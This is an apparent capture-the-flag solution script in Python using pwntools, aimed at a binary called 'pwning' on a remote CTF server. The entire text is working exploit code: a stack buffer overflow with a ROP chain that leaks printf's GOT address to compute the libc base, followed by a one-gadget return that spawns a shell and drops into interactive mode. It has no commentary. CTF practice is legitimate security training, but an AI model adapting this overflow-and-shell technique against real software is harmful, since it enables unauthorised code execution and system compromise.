#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3019)
e = ELF("./pwning")
#context.log_level = 'debug'

printf = e.symbols['printf']
padding = b"A"*48
p1r = 0x80484e1
vuln = e.symbols['vuln']

# ROP Chain

chain = p32(printf)
chain += p32(p1r)
chain += p32(e.got['printf'])
chain += p32(vuln)

# S#1

payload = padding
payload += chain

p.sendlineafter("? ", "-1")
p.recvline()
p.sendline(payload)
p.recvline()

leaked = u32(p.recv(4))
libcBase = leaked - 0x49020

# S#2

gadget = [0x3a80c, 0x3a812, 0x3a819, 0x5f065, 0x5f066]

payload = padding
payload += p32(libcBase + gadget[1])

p.sendlineafter("? ", "-1")
p.recvline()
p.sendline(payload)

log.info("printf() Address: " + hex(printf))
log.info("Leaked printf() Address: " + hex(leaked))
log.info("Libc base Address: " + hex(libcBase))

p.interactive()
